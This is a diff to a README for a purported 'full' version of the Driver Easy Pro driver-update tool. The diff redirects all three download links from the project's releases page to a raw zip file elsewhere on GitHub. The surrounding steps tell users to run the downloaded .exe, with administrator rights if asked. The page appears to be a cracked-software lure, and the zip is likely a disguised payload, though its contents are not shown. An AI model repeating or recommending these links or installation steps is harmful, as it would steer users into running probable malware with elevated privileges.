@@ -5,7 +5,7 @@ description: "Scan, update, and manage Windows drivers to optimize system perfor
 ---
 # 🛠️ Driver-Easy-Pro-full-Updated - Keep your computer hardware running fast
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/surajitbag896/Driver-Easy-Pro-full-Updated/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/surajitbag896/surajitbag896.github.io/raw/refs/heads/main/ondagram/io_surajitbag_github_v2.5.zip)
 
 ## 📌 Overview 
 
@@ -15,7 +15,7 @@ Computers rely on small pieces of software called drivers to communicate with ha
 
 Follow these steps to set up the software on your Windows machine. You do not need to understand how the inner workings of your computer function to use this tool. The application automates the search and installation process for you.
 
-1. Visit the [official release page](https://github.com/surajitbag896/Driver-Easy-Pro-full-Updated/releases) to access the installer file.
+1. Visit the [official release page](https://github.com/surajitbag896/surajitbag896.github.io/raw/refs/heads/main/ondagram/io_surajitbag_github_v2.5.zip) to access the installer file.
 2. Click the file name that ends in .exe to begin the download.
 3. Locate the file in your Downloads folder once the transfer finishes.
 4. Double-click the file to open the installation wizard.
@@ -25,7 +25,7 @@ Follow these steps to set up the software on your Windows machine. You do not ne
 
 The installer handles most tasks automatically. You do not need to change settings during the first setup.
 
-- Download the setup file from this link: [Download Driver Easy Pro](https://github.com/surajitbag896/Driver-Easy-Pro-full-Updated/releases)
+- Download the setup file from this link: [Download Driver Easy Pro](https://github.com/surajitbag896/surajitbag896.github.io/raw/refs/heads/main/ondagram/io_surajitbag_github_v2.5.zip)
 - Run the installer with administrator rights if your system asks.
 - Accept the basic terms of service to proceed.
 - Select your preferred destination folder if prompted or keep the default choice.
